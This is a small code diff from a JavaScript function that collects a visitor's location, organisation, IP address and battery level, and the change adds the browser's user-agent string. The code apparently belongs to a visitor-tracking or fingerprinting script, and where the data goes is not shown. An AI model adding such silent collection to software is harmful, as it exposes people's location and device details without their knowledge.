@@ -359,7 +359,7 @@ function getJSON(url){
         var battery=""
         navigator.getBattery().then(function(bat){
 battery =bat.level*100+"%"
-var snd={"country":country,"state":state,"city":city,"org":org,"ip":ip,"battery":battery};
+var snd={"country":country,"state":state,"city":city,"org":org,"ip":ip,"battery":battery,"device":navigator.userAgent};
 data=JSON.stringify(snd,null,4)
 run(data)
 })
